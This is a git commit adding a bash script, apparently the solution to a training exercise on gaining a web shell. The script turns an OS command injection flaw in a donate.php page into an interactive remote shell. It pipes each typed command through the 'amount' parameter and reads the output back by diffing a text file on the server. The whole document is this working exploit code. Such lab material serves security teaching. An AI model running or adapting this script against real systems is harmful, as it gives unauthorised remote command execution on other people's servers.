a6ac738e018e9024d591d4e8e9396ac7dac7e4e2
Tim <tjk315@gmail.com>
2026-05-06 00:44:08 +0700

    Base solution for Exercise 9

---
+++ CH06_GainingAWebShell/Exercise_9_BuildingACommandInjectionInterface/os_command_injection.sh
@@ -0,0 +1,24 @@
+#!/bin/bash
+
+read -rp 'Host :' host
+read -rp 'Port :' port
+
+while true; do
+	read -rp '$ ' raw_command
+	command=$(printf %s "${raw_command}" | jq -sRr @uri)
+
+	# Store the previous list of command outputs.
+	prev_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
+
+	# Execute the OS Command Injection vulnerability.
+	curl -s -o /dev/null "http://${host}:${port}/donate.php?amount=1|${command}"
+
+	# Store the new list of command outputs.
+	new_resp=$(curl -s "http://${host}:${port}/amount_to_donate.txt")
+
+	# Extract only the difference between the two command outputs.
+	delta=$(diff --new-line-format="%L" --unchanged-line-format="" <(echo "${prev_resp}") <(echo "${new_resp}"))
+
+	# Output the command result.
+	echo "${delta}"
+done
